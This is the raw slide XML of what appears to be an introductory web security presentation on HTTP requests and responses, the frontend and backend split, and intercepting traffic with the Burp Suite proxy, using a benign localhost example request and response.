            <a:ext cx="2298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Location and URL Parameters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E0A4E-255C-62DC-5F73-A951BF8E26C7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9499600" y="3428999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Headers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99ECE-83DF-E011-3C56-1395E8D3A381}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9499600" y="5093492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47DE67-485B-B167-68DF-85425F2D2F22}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3556000" y="1304283"/>
            <a:ext cx="5257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GET Requests (also DELETE)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Picture 4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FDD0CD96-8F37-B672-9B5F-1499FC413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B6BA8AE5-DFFE-E395-B64B-3F2E0225115B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327166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C7B50-79FE-C572-F265-95AF6311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7069-37E3-5640-7AD3-C0FB1B87C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Anatomy of Requests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8942C-4D99-D027-7C6A-2FA5A6048B0D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97816-0E55-F289-5A9D-3BCE8F7D5240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A3BBC0-F095-185C-46C6-BCDFDFA75C7C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6EFF99-63F9-A3B2-3062-457ED862024C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A8E3B6-7658-459D-4722-A476B512735F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A5948E-6148-F2D9-2790-D8C9C6D670AE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7C57B72-6550-DCAC-CB27-FF6B749CDFA4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2DF84F7-FF14-34D9-A5EF-30C3628CE523}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3209920" y="1841505"/>
            <a:ext cx="6134101" cy="4615346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E22DE-DB20-6998-CD54-9BD8D4FE89C7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3365500" y="2137477"/>
            <a:ext cx="59785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POST /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api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/claims HTTP/1.1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Host: localhost:3000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Content-Length: 73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Accept: application/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json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, text/plain, */*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Content-Type: application/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json</a:t>
            </a:r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Origin: http://localhost:3000</a:t>
            </a:r>
          </a:p>
          <a:p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Referer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: http://localhost:3000/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Cookie: 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authToken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=eyJhbGciOiJIUzI1NiIsI</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="67CA95"/>
                </a:solidFill>
                <a:latin typeface="Aptos Mono" panose="020B0009020202020204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>[…]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Connection: keep-alive</a:t>
            </a:r>
          </a:p>
          <a:p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{"title":"Test","description":”Test","amount":"3454","category":"Other"}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DA5548-AF4C-7E6C-7FBD-1480217468D2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3209920" y="2760423"/>
            <a:ext cx="7318380" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="38100">
            <a:solidFill>
              <a:srgbClr val="67CA9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957E35-EC27-A2D0-2497-49C865F8C5AC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3209920" y="4754323"/>
            <a:ext cx="7318380" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="38100">
            <a:solidFill>
              <a:srgbClr val="67CA9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CF5F5F-D9B7-5399-B531-700BA8D50C2F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9378950" y="1906644"/>
            <a:ext cx="2298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Location and URL Parameters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CA9B43-1DFF-03C1-22C0-B321FE0C8FC9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9499600" y="3428999"/>
            <a:ext cx="1409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Headers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0A1DB-6117-77F3-7E38-2778F38FC4A3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9499600" y="5093492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Body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202892-2818-4F52-20B8-09EB9F989902}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3556000" y="1304283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POST/PUT Requests</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="Picture 5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1E385D88-87EA-70ED-705E-FA5D0B8DC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9B87166C-7955-2464-E9DF-E62759A2A49F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827697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E805E-30E4-186F-7A61-340E5271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AAA1-5A35-2832-36F4-B9C4F5BBA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Anatomy of Responses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DAEB28-7B8A-4992-ED35-2E7F40C7EA67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9F7B01-859B-5D22-7ADB-F3CD5A5641BB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1CB4DD-8865-AEE6-F511-5B35FE0BBF3E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9E02CE-3966-90E1-3A1F-1B5A03C8DC81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9E64D9-4FE4-39DA-5FB0-71167164A2C8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31D3B6-82F2-CCB0-DC1F-144AC54A621B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52E0DB-6098-70FE-C7B2-02F6C1287F2C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D37917E-3F5E-927E-DE56-35C1C2436FE8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3209920" y="1841505"/>
            <a:ext cx="6134101" cy="4615346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17D49-E18D-AB1D-FE60-345A14C5804B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3365500" y="2137477"/>
            <a:ext cx="55499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HTTP/1.1 200 OK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access-control-allow-credentials: true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set-cookie: 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authToken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=eyJhbGciOiJIUzI1NiIsInR</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="67CA95"/>
                </a:solidFill>
                <a:latin typeface="Aptos Mono" panose="020B0009020202020204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>[…]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; Max-Age=86400; Path=/; Expires=Sun, 01 Feb 2026 17:30:16 GMT; Secure; SameSite=None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content-type: application/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json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; </a:t>
            </a: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content-length: 79</a:t>
            </a:r>
          </a:p>
          <a:p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  <a:p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{"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message":"Login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ptos Mono" panose="020B0009020202020204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>successful","user</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Aptos Mono" panose="020B0009020202020204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>":{"id":5,"username":"alice","role":"user"}}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7C2469-132C-FADE-24E1-A0001DB9F0F1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3209920" y="2481023"/>
            <a:ext cx="7318380" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="38100">
            <a:solidFill>
              <a:srgbClr val="67CA9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6747BF-652D-500A-1A0F-D672724E572E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3209920" y="4754323"/>
            <a:ext cx="7318380" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="38100">
            <a:solidFill>
              <a:srgbClr val="67CA9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5CECB5-1FE9-5A7C-8CBE-7344310B4C94}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9378950" y="1906644"/>
            <a:ext cx="229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Response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51CD0-62E0-8B6F-544A-24E88F653E09}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9499600" y="3428999"/>
            <a:ext cx="1409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Headers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E6296-0A7B-76B6-86A2-0E8F169F786F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9499600" y="5093492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Body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5B770-DC45-B5D4-8B85-D278644986CA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3556000" y="1304283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Responses</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="Picture 5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04E023A9-A2A3-14F5-5120-3E8E9046B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6F63D10-5E70-4336-6108-2684C818F6F1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58043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6C073-75FF-E488-7F36-16D8ECE3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51F6-7D91-4B3C-E46A-0F849C578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Frontend, Backend, and Browser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1EFE3B-6912-455E-C0A6-10AC277194D5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8FC86C-3267-982B-A7BB-75BB0D9A67A6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A076B3-CCAD-4ABA-F699-E66F55509E57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29DB90-43A0-779B-88D7-FE35D6E3F290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21AEB7-9DCF-F571-8ED7-D0B55A6D25BF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F76494-7201-3271-6F35-8891CE3F34A8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1EE4B7-EF78-DF47-799B-1F6D3A30A6E8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68D0FCE-E8BA-2E9A-7959-7B3D01196C52}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3076893" y="3069799"/>
            <a:ext cx="2035652" cy="219850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HTML</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>CSS</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>JavaScript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D2A817-6D75-206E-4600-443B141F9992}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2922111" y="2479564"/>
            <a:ext cx="3171510" cy="3004810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CCE923-BD6F-E3EB-EF96-1C21D371D483}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9366256" y="2194731"/>
            <a:ext cx="2508828" cy="2618403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7C078-5E03-FEEA-7B4E-4A32AEB9AF59}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3660866" y="2479564"/>
            <a:ext cx="14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Browser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3026A-002C-22AE-272E-77C9A3D8ACF3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3303572" y="3069799"/>
            <a:ext cx="1582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AA05E-6D21-D93C-F714-5EDBB0A24D70}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9852960" y="2166144"/>
            <a:ext cx="1535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Backend</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="15" name="Graphic 14" descr="Cloud with solid fill">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D4B15494-6432-7CCD-6DDE-835B9B84F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796" y="2614625"/>
            <a:ext cx="1792768" cy="1792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D38001-935B-005F-000F-DB67981C1A3C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7685373" y="3884173"/>
            <a:ext cx="1399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4363CA-53E0-73F7-88A0-683CED9E178F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2740820" y="1589692"/>
            <a:ext cx="4663284" cy="4071121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D0CAC-E984-3F0B-90B2-3F015FEE266C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3813143" y="1589692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Client Machine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E3628A78-1F20-358B-711E-39C3BD0DD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A51D82E6-918F-554D-8134-88C592ACCCAA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741055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84EEF-1A8F-E4CB-1CC0-0DC31B30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01AF2C-89C5-83F9-7824-E119383C1F0C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7D8A7A-1201-A0B4-6203-5E78CF4B3ECE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9FFA97-BB29-8EBB-CE16-8762B4AB2A79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BC696C-9D94-A951-327B-81F0A81079B6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0F3B5B-828A-9B83-0033-34E399792135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DBAC26-5C92-86E6-95AD-0E19BC912184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E30089-276B-FF6E-9C82-0AE58B31E9C3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16CEC4-BBD1-E043-7B8E-A82198C0B040}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3076893" y="3069799"/>
            <a:ext cx="2035652" cy="219850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HTML</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>CSS</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>JavaScript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6E2951-98DF-31BD-C9E2-F26B98701D02}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2922111" y="2479564"/>
            <a:ext cx="3171510" cy="3004810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8ED2F0-8E11-01CA-414A-6BB49A81C3B0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9366256" y="2194731"/>
            <a:ext cx="2508828" cy="2618403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DBDA0-5075-1AE9-C90B-B405EFF554FE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3660866" y="2479564"/>
            <a:ext cx="14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Browser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3B0FDB-ED60-F1D4-1510-470CB86ECA4D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3303572" y="3069799"/>
            <a:ext cx="1582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629DE-0BE4-7480-18A4-280AF8C39491}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9852960" y="2166144"/>
            <a:ext cx="1535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Backend</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="15" name="Graphic 14" descr="Cloud with solid fill">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1A000EB5-26C4-624C-6334-74767338A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796" y="2614625"/>
            <a:ext cx="1792768" cy="1792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80C7BA-93B9-9BEB-E711-A1A9501A5245}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7685373" y="3884173"/>
            <a:ext cx="1399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42E92BC-B932-1FF9-02A3-CB827B8EDB49}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2740820" y="1589692"/>
            <a:ext cx="4663284" cy="4071121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E0CD57-2F39-E6AE-1BF8-D52CC1CD9147}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3813143" y="1589692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Client Machine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A8A6FDF-6D69-BB6F-3DFA-ED6BAA96E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702" y="4095476"/>
            <a:ext cx="766321" cy="76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06EEB5-85C4-549A-0EAE-1983EF605173}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5807559" y="6024891"/>
            <a:ext cx="3475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Burp Suite Web Proxy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1936429-CB7B-22B4-611C-A81B445988F1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:stCxn id="12" idx="0"/>
            <a:endCxn id="1032" idx="2"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1" flipV="1">
            <a:off x="6748863" y="4861797"/>
            <a:ext cx="796255" cy="1163094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A63655C3-8864-A1DF-4B04-5C203BA4C6A5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2814638" y="119859"/>
            <a:ext cx="9258299" cy="9032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>
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Frontend, Backend, and Browser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21" name="Picture 20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1B6054E4-D6CA-6695-99D7-9E0B86C3D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537FD382-69BF-BD43-6EF3-53726F09BFF6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36227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1B17D-C524-D93D-C1B4-D1B8CE54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85EEED-5839-B4F0-2F01-3A549E54EE64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434947-5A9B-DC36-ABA6-F52FBE44C6A1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FED5C3-22C3-9692-A22A-2209BCBC7A43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C23687-7AE8-C333-C4DC-B4E997983DB1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192BAA-10B4-F52E-881F-3AC46D2FFE3A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2C5191-676C-7471-8452-21A688468CD9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315515-EBAA-1B81-DBDF-881508C24296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DE4690E4-C81C-B373-C281-34D31E09000A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2957511" y="1540272"/>
            <a:ext cx="8980883" cy="50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Most Important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Requests to the Backend do </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>NOT </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>need to have originated from the Frontend!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The Frontend is controlled by the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Client</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>!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The Frontend is a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>useful map</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>nothing more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The </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Backend</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> API sits on the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Internet!</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200" algn="l">
              <a:buFontTx/>
              <a:buChar char="-"/>
            </a:pP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3" name="Picture 12" descr="A pixelated cartoon of a person holding a computer&#10;&#10;AI-generated content may be incorrect.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FEDEB204-019C-E167-D5C5-DC9E8E0E0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59663" y="5317728"/>
            <a:ext cx="1468438" cy="1473200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="26" name="Picture 25" descr="A pixel art of a green character holding a computer&#10;&#10;AI-generated content may be incorrect.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A41FB000-1829-FB6F-339F-954EFC060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87" y="5317728"/>
            <a:ext cx="1473200" cy="1473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8175199-3C1B-7E61-7E60-8CCAE23F5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Frontend, Backend, and Browser</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Picture 7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DB5CED2C-82B2-FED6-D29F-70F8B5D6C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E2AABCA9-1367-EB7E-9252-739F4A8632B7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679093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A85C4-C8D7-4C63-DD6F-60ADA11D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06DBBB-67D1-F0FA-6A30-D2E6A960FE6C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5112545" y="3428999"/>
            <a:ext cx="42537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F9CB445-1747-5C24-061B-E62C758C976D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5112544" y="4478636"/>
            <a:ext cx="425371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775D8BB-686C-412F-658C-76DAEE6B8679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DA1106-FF64-AD03-B0F6-A0D7433A13F8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34D186-C61F-BB03-4974-4A51450A7E39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C52B9-F998-E168-8B80-A9B008481FB7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2D7BAD-C5FB-BB05-3AD9-EA22F35DCA8B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B491B46-63CF-6F24-11C0-CB80E568C705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5317CA8-EE8D-D43A-01D1-2B26A08FD9A8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8E313EC-4A17-62F6-E8E5-BA6FB2892707}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3076893" y="3069799"/>
            <a:ext cx="2035652" cy="219850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HTML</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>CSS</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>JavaScript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957625-1478-1989-61F3-7067528EF436}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2922111" y="2479564"/>
            <a:ext cx="3171510" cy="3004810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D1BE71-26AC-7656-7AE0-7EBC18DB66BF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9366256" y="2194731"/>
            <a:ext cx="2508828" cy="2618403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0B4EA-8F90-3DB5-BFAB-D0DA30426F9C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3660866" y="2479564"/>
            <a:ext cx="14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Browser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189FF-E890-B56E-DE81-79603795773E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3303572" y="3069799"/>
            <a:ext cx="1582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57582-542A-41BA-06C1-2DE9EF06DE86}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9852960" y="2166144"/>
            <a:ext cx="1535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Backend</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="15" name="Graphic 14" descr="Cloud with solid fill">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8497604D-5F61-AB87-A0A9-F16D4CFF2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8796" y="2614625"/>
            <a:ext cx="1792768" cy="17927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EAB777E-8392-7B04-232D-874CA7E62958}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7685373" y="3884173"/>
            <a:ext cx="1399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Internet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5FFADBE-AA12-5EFA-AD91-D060F4144EED}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2740820" y="1589692"/>
            <a:ext cx="4663284" cy="4071121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32D6AB-0D1D-82FC-D45D-6AA1F31E6033}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3813143" y="1589692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Client Machine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DD34B042-DA61-5FFD-BB7F-71CEBD21D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702" y="4095476"/>
            <a:ext cx="766321" cy="76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A68A2E-2C0F-240F-E661-EBCC4954F060}"/>
              </a:ext>
